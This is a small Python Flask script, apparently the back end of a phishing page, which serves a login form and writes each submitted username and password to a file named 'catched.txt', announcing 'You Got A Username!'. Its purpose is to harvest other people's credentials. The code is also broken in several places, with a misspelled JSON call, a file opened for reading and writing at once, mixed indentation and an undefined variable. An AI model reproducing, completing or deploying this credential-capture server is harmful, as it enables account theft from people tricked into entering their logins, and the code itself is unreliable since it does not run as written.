import os
import signal
import subprocess
import json
from flask import *

app = Flask("Web Server")
@app.route('/', methods = ["GET"])
def Index():
	return render_template('index.html')
@app.route('/get',methods = ['POST', 'GET'])
def GetRequest():
	username = request.form["username"]
	password = request.form["password"]
	if username != None and password != None:
		with open("catched.txt", "r") as readed, open("catched.txt", "w") as write:
		    N_readed = json.leads(readed.read())
			num = len(N_readed)
			N_readed = N_readed[num]["username"] = username
			N_readed = N_readed[num]["password"] = password
			write.write(json.dumps(N_readed))
		print("You Got A Username!")
		return render_template('ok.html')
	else:
		return "Oh No Something Went Wrong"
def Start():
	app.run(port=1000)
	input("Use enter to stop it: ")
	os.killpg(os.getpgid(process.pid), signal.SIGTERM)